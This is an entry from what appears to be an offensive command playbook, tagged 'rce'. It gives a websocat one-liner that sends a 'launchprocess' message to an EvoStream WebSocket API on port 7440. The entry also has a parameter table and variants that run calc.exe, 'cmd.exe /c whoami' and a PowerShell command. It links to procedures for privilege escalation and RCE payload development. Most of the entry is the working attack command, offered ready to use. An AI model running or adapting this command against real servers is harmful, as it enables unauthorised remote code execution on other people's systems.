---
data: >-
  echo '{"command": "launchprocess", "binary": "calc.exe"}' | websocat
  ws://localhost:7440
tags:
  - websocket
  - rce
type: command
executor: bash
platforms:
  - Windows
  - Linux
id: 6dd97599-fc51-4262-b4a6-85a027a2316a
created_at: '2025-12-11T06:10:22.813Z'
updated_at: '2025-12-11T06:10:22.813Z'
verified: false
validated: true
submitted: true
---
# launchprocess-websocket

## Command

```bash
echo '{"command": "launchprocess", "binary": "calc.exe"}' | websocat ws://localhost:7440
```

## Description

Sends a WebSocket message to the EvoStream API to launch a process like calc.exe, used for command injection and RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `binary` | Path to executable | Yes |
| `args` | Command arguments | No |

## Examples

### Basic Usage

```bash
echo '{"command": "launchprocess", "binary": "cmd.exe", "args": "/c whoami"}' | websocat ws://localhost:7440
```

### Advanced Usage

```bash
echo '{"command": "launchprocess", "binary": "powershell.exe", "args": "-c Get-Process"}' | websocat ws://localhost:7440
```

## Expected Output

JSON response confirming process launch, or the output of the executed command.

## Related

- [[procedures/Exploit-Local-Privilege-Escalation]]
- [[procedures/Develop-Remote-Code-Execution-Payload]]
